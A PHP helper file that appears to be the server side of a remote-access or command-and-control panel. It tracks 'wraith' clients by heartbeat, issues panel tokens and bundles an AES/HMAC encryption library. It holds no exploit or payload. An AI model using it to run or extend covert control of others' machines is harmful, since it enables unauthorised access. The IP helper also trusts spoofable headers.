<?php

// Get IP of client
function get_client_ip()
{
    $ipaddress = 'UNKNOWN';
    $keys=array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR');
    foreach($keys as $k)
    {
        if (isset($_SERVER[$k]) && !empty($_SERVER[$k]) && filter_var($_SERVER[$k], FILTER_VALIDATE_IP))
        {
            $ipaddress = $_SERVER[$k];
            break;
        }
    }
    return $ipaddress;
}

// Get contents of database
function get_db() {
	$db = file_get_contents(dirname(__FILE__)."/db.json");
	$db = json_decode($db, true);
	return $db;
}

// Update values of database
function write_db($newdb) {
	file_put_contents(dirname(__FILE__)."/db.json", json_encode($newdb, JSON_PRETTY_PRINT));
}

// Add a wraith to db or modify existing wraith (if existing ID supplied) or remove if remove mode specified
function wraithdb($id, $wraith, $mode="add/mod") {
	$db=get_db();
	if ($mode === "add/mod") {
		$db["active_wraith_clients"][$id]=$wraith;
		write_db($db);
	} elseif ($mode === "rmov") {
		unset($db["active_wraith_clients"][$id]);
		write_db($db);
	} elseif ($mode === "get") {
		return $db["active_wraith_clients"][$id];
	} elseif ($mode === "checkexist") {
		if (haskeys($db["active_wraith_clients"], [$id])) {
			return true;
		} else {
			return false;
		}
	}
}

// Check for wraiths which expired and remove them
function expire_wraiths() {
	$db = get_db();
	foreach($db["active_wraith_clients"] as $id => $values) { 
	    if (time()-$values["lastheartbeat"] > $db["settings"]["wraith_no_heartbeat_mark_dead_delay_seconds"]) {
		wraithdb($id, null, "rmov");
	    } 
	}
}

// Update a wraith's last hearbeat to keep it from being marked as dead
function wraith_heartbeat($id) {
	// Get wraith
	$new_wraith_db_entry = wraithdb($id, null, "get");
	$new_wraith_db_entry["lastheartbeat"] = time();
	wraithdb($id, $new_wraith_db_entry);
}

// Check if array has these keys
function haskeys($array, $keys) {
	if (!(count(array_diff($keys, array_keys($array))) === 0)) {
		return false;
	} else {
		return true;
	}
}

// Generate unique identifier
function gen_uuid() {
    $data = openssl_random_pseudo_bytes(16);

    $data[6] = chr(ord($data[6]) & 0x0f | 0x40); // set version to 0100
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80); // set bits 6-7 to 10

    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

// Log the panel in
function panel_login() {
	// Generate creds for the panel
	$panel_login_token = bin2hex(openssl_random_pseudo_bytes(8));
	$panel_crypt_key = bin2hex(openssl_random_pseudo_bytes(20));
	// Write creds to db
	$current_db = get_db();
	$current_db["current_panel_login_token"] = $panel_login_token;
	$current_db["current_panel_crypt_key"] = $panel_crypt_key;
	write_db($current_db);
	// Return the new values
	return array($panel_login_token, $panel_crypt_key);
}

/**
 * Encrypts data and files using AES CBC/CFB - 128/192/256 bits. 
 * 
 * The encryption and authentication keys 
 * are derived from the supplied key/password using HKDF/PBKDF2.
 * The key can be set either with `setMasterKey` or with `randomKeyGen`.
 * Encrypted data format: salt[16] + iv[16] + ciphertext[n] + mac[32].
 * Ciphertext authenticity is verified with HMAC SHA256.
 * 
 * @author Tasos M. Adamopoulos
 */
class AesEncryption {
    private $modes = [
        "CBC" => "AES-%d-CBC", "CFB" => "AES-%d-CFB8"
    ];
    private $sizes = [128, 192, 256];
    private $saltLen = 16;
    private $ivLen = 16;
    private $macLen = 32;
    private $macKeyLen = 32;

    private $mode;
    private $keyLen;
    private $masterKey = null;

    /** @var int $keyIterations The number of PBKDF2 iterations. */
    public $keyIterations = 20000;

    /** @var bool $base64 Accepts and returns base64 encoded data. */
    public $base64 = true;

    /** 
     * Creates a new AesEncryption object.
     * 
     * @param string $mode Optional, the AES mode (CBC, CFB).
     * @param int $size Optional, the key size (128, 192, 256).
     * @throws UnexpectedValueException if the mode or size is not supported.
     */
    public function __construct($mode = "CBC", $size = 128) {
        $this->mode = strtoupper($mode);
        $this->keyLen = $size / 8;

        if (!array_key_exists($this->mode, $this->modes)) {
            throw new UnexpectedValueException("$mode is not supported!");
        }
        if (!in_array($size, $this->sizes)) {
            throw new UnexpectedValueException("Invalid key size!");
        }
    }
    
    /**
     * Encrypts data using a key or the supplied password.
     *
     * The password is not required if a master key has been set 
     * (either with `randomKeyGen` or with `setMasterKey`). 
     * If a password is supplied, it will be used to create a key with PBKDF2.
     * 
     * @param string $data The plaintext.
     * @param string $password Optional, the password.
     * @return string|null Encrypted data: salt + iv + ciphertext + mac.
     */
    public function encrypt($data, $password = null) {
        $salt = $this->randomBytes($this->saltLen);
        $iv = $this->randomBytes($this->ivLen);
        try {
            list($aesKey, $macKey) = $this->keys($salt, $password);
            $cipher = $this->cipher($aesKey, $iv, Cipher::Encrypt);

            $ciphertext = $cipher->update($data, true);
            $mac = $this->sign($iv.$ciphertext, $macKey); 
            $encrypted = $salt . $iv . $ciphertext . $mac;
            
            if ($this->base64) {
                $encrypted = base64_encode($encrypted);
            }
            return $encrypted;
        } catch (RuntimeException $e) {
            $this->errorHandler($e);
        }
    }
    
    /**
     * Decrypts data using a key or the supplied password.
     *
     * The password is not required if a master key has been set 
     * (either with `randomKeyGen` or with `setMasterKey`). 
     * If a password is supplied, it will be used to create a key with PBKDF2.
     * 
     * @param string $data The ciphertext.
     * @param string $password Optional, the password.
     * @return string|null Plaintext.
     */
    public function decrypt($data, $password = null) {
        $data = $this->base64 ? base64_decode($data, true) : $data;
        try {
            if ($data === false) {
                throw new UnexpectedValueException("Invalid data format!");
            }
            $salt = mb_substr($data, 0, $this->saltLen, "8bit");
            $iv = mb_substr($data, $this->saltLen, $this->ivLen, "8bit");
            $ciphertext = mb_substr(
                $data, $this->saltLen + $this->ivLen, -$this->macLen, "8bit"
            );
            $mac = mb_substr($data, -$this->macLen, $this->macLen, "8bit");

            list($aesKey, $macKey) = $this->keys($salt, $password);
            $this->verify($iv.$ciphertext, $mac, $macKey);
            
            $cipher = $this->cipher($aesKey, $iv, Cipher::Decrypt);
            $plaintext = $cipher->update($ciphertext, true);
            return $plaintext;
        } catch (RuntimeException $e) {
            $this->errorHandler($e);
        } catch (UnexpectedValueException $e) {
            $this->errorHandler($e);
        }
    }
    
    /**
     * Encrypts files using a key or the supplied password.
     * 
     * The password is not required if a master key has been set 
     * (either with `randomKeyGen` or with `setMasterKey`). 
     * If a password is supplied, it will be used to create a key with PBKDF2.
     * The original file is not modified; a new encrypted file is created.
     * 
     * @param string $path The file path. 
     * @param string $password Optional, the password.
     * @return string|null Encrypted file path.
     */
    public function encryptFile($path, $password = null) {
        $salt = $this->randomBytes($this->saltLen);
        $iv = $this->randomBytes($this->ivLen);
        try {
            $newPath = $path . ".enc";
            if (($fp = fopen($newPath, "wb")) === false) {
                throw new RuntimeException("Can't access '$newPath'!");
            }
            fwrite($fp, $salt.$iv);

            list($aesKey, $macKey) = $this->keys($salt, $password);
            $cipher = $this->cipher($aesKey, $iv, Cipher::Encrypt);
            $hmac = new HmacSha256($macKey, $iv);
            $chunks = $this->fileChunks($path);

            foreach ($chunks as list($chunk, $final)) {
                $ciphertext = $cipher->update($chunk, $final);
                $hmac->update($ciphertext);
                fwrite($fp, $ciphertext);
            }
            $mac = $hmac->digest();
            fwrite($fp, $mac);
            fclose($fp);
            return $newPath;
        } catch (RuntimeException $e) {
            $this->errorHandler($e);
        }
    }
    
    /**
     * Decrypts files using a key or the supplied password.
     * 
     * The password is not required if a master key has been set 
     * (either with `randomKeyGen` or with `setMasterKey`). 
     * If a password is supplied, it will be used to create a key with PBKDF2.
     * The original file is not modified; a new decrypted file is created.
     * 
     * @param string $path The file path. 
     * @param string $password Optional, the password.
     * @return string|null Decrypted file path.
     */
    public function decryptFile($path, $password = null) {    
        try {
            if (($fp = fopen($path, "rb")) === false) {
                throw new RuntimeException("Can't access '$path'!");
            }
            $salt = fread($fp, $this->saltLen); 
            $iv = fread($fp, $this->ivLen);
            fseek($fp, filesize($path) - $this->macLen);
            $mac = fread($fp, $this->macLen);
            fclose($fp);

            list($aesKey, $macKey) = $this->keys($salt, $password);
            $this->verifyFile($path, $mac, $macKey);
            $newPath = preg_replace("/\.enc$/", ".dec", $path);

            if (($fp = fopen($newPath, "wb")) === false) {
                throw new RuntimeException("Can't access '$newPath'!");
            }
            $cipher = $this->cipher($aesKey, $iv, Cipher::Decrypt);
            $chunks = $this->fileChunks(
                $path, $this->saltLen + $this->ivLen, $this->macLen
            );
            foreach ($chunks as list($data, $final)) {
                $plaintext = $cipher->update($data, $final);
                fwrite($fp, $plaintext);
            }
            fclose($fp);
            return $newPath;
        } catch (UnexpectedValueException $e) {
            $this->errorHandler($e);
        } catch (RuntimeException $e) {
            $this->errorHandler($e);
        }
    }
    
    /**
     * Sets a new master key.
     * This key will be used to create the encryption and authentication keys.
     * 
     * @param string $key The new master key.
     * @param bool $raw Optional, expexts raw bytes (not base64-encoded).
     */
    public function setMasterKey($key, $raw = false) {
        $key = ($raw) ? $key : base64_decode($key, true);
        if ($key === false) {
            $this->errorHandler(new RuntimeException('Failed to decode the key!'));
        } else {
            $this->masterKey = $key;
        }
    }

    /**
     * Returns the master key (or null if the key is not set).
     * 
     * @param bool $raw Optional, returns raw bytes (not base64-encoded).
     * @return string|null The master key.
     */
    public function getMasterKey($raw = false) {
        if ($this->masterKey === null) {
            $this->errorHandler(new RuntimeException("The key is not set!"));
        } elseif (!$raw) {
            return base64_encode($this->masterKey);
        } else {
            return $this->masterKey;
        }
    }

    /**
     * Generates a new random key.
     * This key will be used to create the encryption and authentication keys.
     * 
     * @param int $keyLen Optional, the key size.
     * @param bool $raw Optional, returns raw bytes (not base64-encoded).
     * @return string The new master key.
     */
    public function randomKeyGen($keyLen = 32, $raw = false) {
        $this->masterKey = $this->randomBytes($keyLen);
        if (!$raw) {
            return base64_encode($this->masterKey);
        }
        return $this->masterKey;
    }
    
    /**
     * Handles exceptions (prints the error message by default).
     */
    protected function errorHandler($exception) {
	// Do not echo exceptions to make sure wraith can always read messages
        //echo $exception->getMessage();
    }

    /**
     * Derives encryption and authentication keys from a key or password.
     * If the password is not null, it will be used to create the keys.
     * 
     * @throws RuntimeException if the master key or password is not set.
     */
    private function keys($salt, $password = null) {
        if ($password !== null) {
            $dkey = openssl_pbkdf2(
                $password, $salt, $this->keyLen + $this->macKeyLen, 
                $this->keyIterations, "SHA512"
            );
        } elseif ($this->masterKey !== null) {
            $dkey = $this->hkdfSha256(
                $this->masterKey, $salt, $this->keyLen + $this->macKeyLen
            );
        } else {
            throw new RuntimeException('No password or key specified!');
        }
        return array(
            mb_substr($dkey, 0, $this->keyLen, "8bit"), 
            mb_substr($dkey, $this->keyLen, $this->macKeyLen, "8bit")
        );
    }
    
    /**
     * Returns a new Cipher object; used for encryption / decryption.
     */
    private function cipher($key, $iv, $method) {
        $algorithm = sprintf($this->modes[$this->mode], $this->keyLen * 8);
        return new Cipher($algorithm, $method, $key, $iv);
    }

    /**
     * Creates random bytes, used for IV, salt and key generation.
     */
    private function randomBytes($size) {
        if (is_callable("random_bytes")) {
            return random_bytes($size);
        }
        return openssl_random_pseudo_bytes($size);
    }

    /**
     * Computes the MAC of ciphertext, used for ciphertext authentication.
     */
    private function sign($data, $key) {
        return hash_hmac("SHA256", $data, $key, true);
    }
    
    /**
     * Verifies the authenticity of ciphertext.
     * @throws UnexpectedValueException if MAC is invalid.
     */
    private function verify($data, $mac, $key) {
        $dataMac = $this->sign($data, $key);
        $this->compareMacs($mac, $dataMac);
    }
    
    /**
     * Computes the MAC of ciphertext, used for ciphertext authentication.
     */
    private function signFile($path, $key, $start = 0, $end = 0) {
        $hmac = new HmacSha256($key);
        foreach ($this->fileChunks($path, $start, $end) as $chunk) {
            $hmac->update($chunk[0]);
        }
        return $hmac->digest();
    }
    
    /**
     * Verifies the authenticity of ciphertext.
     * @throws UnexpectedValueException if MAC is invalid.
     */
    private function verifyFile($path, $mac, $key) {
        $fileMac = $this->signFile($path, $key, $this->saltLen, $this->macLen);
        $this->compareMacs($mac, $fileMac);
    }
    
    /**
     * A generator that reads a file and yields chunks of data.
     * Chunk size must be a nultiple of the block size (16 bytes).
     */
    private function fileChunks($path, $beg = 0, $end = 0) {
        $size = 1024;
        $end = filesize($path) - $end;
        $fp = fopen($path, "rb");
        $pos = ($beg > 0) ? mb_strlen(fread($fp, $beg), "8bit") : $beg; 
        
        if ($fp === false || $end === false) {
            throw new RuntimeException("Can't access file '$path'!");
        }
        while ($pos < $end) {
            $size = ($end - $pos > $size) ? $size : $end - $pos;
            $data = fread($fp, $size);
            $pos += mb_strlen($data, "8bit");

            yield array($data, $pos === $end);
        }
        fclose($fp);
    }
    
    /**
     * Safely compares two byte arrays, used for ciphertext uthentication.
     */
    private function constantTimeComparison($macA, $macB) {
        $result = mb_strlen($macA, "8bit") ^ mb_strlen($macB, "8bit");
        $minLen = min(mb_strlen($macA, "8bit"), mb_strlen($macB, "8bit"));

        for ($i = 0; $i < $minLen; $i++) {
            $result |= ord($macA[$i]) ^ ord($macB[$i]);
        }
        return $result === 0;
    }

    /**
     * Compares the received MAC with the computed MAC, used for uthentication.
     * @throws UnexpectedValueException if the MACs don't match.
     */
    private function compareMacs($macA, $macB) {
        if (is_callable("hash_equals") && !hash_equals($macA, $macB)) {
            throw new UnexpectedValueException("MAC check failed!");
        }
        elseif (!$this->constantTimeComparison($macA, $macB)) {
            throw new UnexpectedValueException("MAC check failed!");
        }
    }

    /**
     * A HKDF implementation, with HMAC SHA256.
     * Expands the master key to create the AES and HMAC keys.
     */
    private function hkdfSha256($key, $salt, $keyLen, $info = "") {
        $dkey = "";
        $hashLen = 32;
        $prk = hash_hmac("SHA256", $key, $salt, true);

        for ($i = 0; $i < $keyLen; $i += $hashLen) {
            $data = mb_substr($dkey, -$hashLen, $hashLen, "8bit");
            $data .= $info . pack("C", ($i / $hashLen) + 1);
            $dkey .= hash_hmac("SHA256", $data, $prk, true);
        }
        return mb_substr($dkey, 0, $keyLen, "8bit");
    }
}


/**
 * Encrypts data using AES. Supported modes: CBC, CFB.
 * 
 * This class is a wrapper for openssl_ encrypt/decrypt functions, 
 * that can be used to encrypt multiple chunks of data.
 * The data size must be a multiple of the block size (16 bytes).
 * Note that this class is a helper of AesEncryption 
 * and should NOT be used on its own.
 */
class Cipher {
    private $key;
    private $iv;
    private $mode;
    private $method;

    const Encrypt = "encrypt";
    const Decrypt = "decrypt";

    /**
     * Creates a new Cipher object.
     * 
     * @param string $cipher The encryption algorithm.
     * @param string $method The encryption method.
     * @param string $key The key.
     * @param string $iv The IV.
     */
    function __construct($cipher, $method, $key, $iv) {
        $this->cipher = $cipher;
        $this->method = $method;
        $this->key = $key;
        $this->iv = $iv;
        $this->mode = strtoupper(explode("-", $cipher)[2]);
    }

    /**
     * Encrypts or decrypts a chunk of data.
     * 
     * The data size must be a multiple of 16 (unless it is the last chunk).
     * It is necessary to set `$final` to true for the last chunk, 
     * because it pads and unpads the data in CBC mode.
     * 
     * @throws RuntimeException on openssl error or padding error.
     */
    public function update($data, $final = false) {
        if ($final && $this->method == Cipher::Encrypt && $this->mode == "CBC") {
            $data = $this->pad($data);
        }
        $options = OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING;
        $method =  "openssl_$this->method";
        $newData = $method($data, $this->cipher, $this->key, $options, $this->iv);

        if ($newData === false) {
            throw new RuntimeException(openssl_error_string());
        }
        $ciphertext = ($this->method == Cipher::Encrypt) ? $newData : $data;
        $this->iv = $this->lastBlock($ciphertext);

        if ($final && $this->method == Cipher::Decrypt && $this->mode == "CBC") {
            $newData = $this->unpad($newData);
        }
        return $newData;
    }

    /**
     * Adds PKCS7 padding to plaintext, used with CBC mode.
     */
    private function pad($data) {
        $pad = 16 - (mb_strlen($data, "8bit") % 16);
        return $data . str_repeat(chr($pad), $pad);
    }

    /**
     * Removes PKCS7 padding from plaintext, used with CBC mode.
     * @throws RuntimeException If padding is invalid.
     */
    private function unpad($data) {
        $pad = ord(mb_substr($data, -1, 1, "8bit"));
        $count = substr_count(mb_substr($data, -$pad, $pad, "8bit"), chr($pad));

        if ($pad < 1 || $pad > 16 || $count != $pad) {
            throw new RuntimeException("Padding is invalid!");
        }
        return mb_substr($data, 0, -$pad, "8bit");
    }
    
    /**
     * Returns the last block of ciphertext, 
     * which is used as an IV for openssl, to chain multiple chunks.
     */
    private function lastBlock($data) {
        return mb_substr($data, -16, 16, '8bit');
    }
}


/**
 * A HMAC with SHA256 algorithm implementation.
 * 
 * Because it has an update method, it can be used for large data, 
 * that can't be hashed with hash_hmac or hash_hmac_file.
 * Note that this class is a helper of AesEncryption  
 * and should NOT be used on its own.
 */
class HmacSha256 {
    private $inner;
    private $outer;
    private $blockSize = 64;

    /**
     * @param string $key The key.
     * @param string $data Optional, initiates the HMAC with data.
     */
    function __construct($key, $data = null) {
        $key = $this->zeroPadKey($key);

        $this->inner = hash_init("SHA256");
        $this->outer = hash_init("SHA256");
        $iKey = $this->xorKey($key, 0x36);
        $oKey = $this->xorKey($key, 0x5C);

        hash_update($this->inner, $iKey);
        hash_update($this->outer, $oKey);
        $this->update($data);
    }
    
    /**
     * Updates the HMAC with new data.
     * 
     * @param string $data The data.
     */
    public function update($data) {
        hash_update($this->inner, $data);
    }
    
    /**
     * Returns the computed HMAC.
     * 
     * @param bool $raw Optional, returns raw bytes.
     * @return string The HMAC.
     */
    public function digest($raw = true) {
        $innerHash = hash_final($this->inner, true);
        hash_update($this->outer, $innerHash);
        return hash_final($this->outer, $raw);
    }
    
    /**
     * XORs the inner and outer keys with ipad/opad values.
     */
    private function xorKey($key, $value) {
        $xorVal = function($n) use($value) { return chr($n ^ $value); };
        $int2chr = function($n) { return chr($n); };

        $values = array_map($xorVal, range(0, 256));
        $trans = array_combine(array_map($int2chr, range(0, 256)), $values);
        return strtr($key, $trans);
    }
    
    /** 
     * Pads the key to match the hash block size.
     */
    private function zeroPadKey($key) {
        if (mb_strlen($key, "8bit") > $this->blockSize) {
            $key = hash("SHA256", $key, true);
        }
        $padLen = $this->blockSize - mb_strlen($key, "8bit");
        $pad = str_repeat("\0", $padLen);
        return $key . $pad;
    }
}
?>
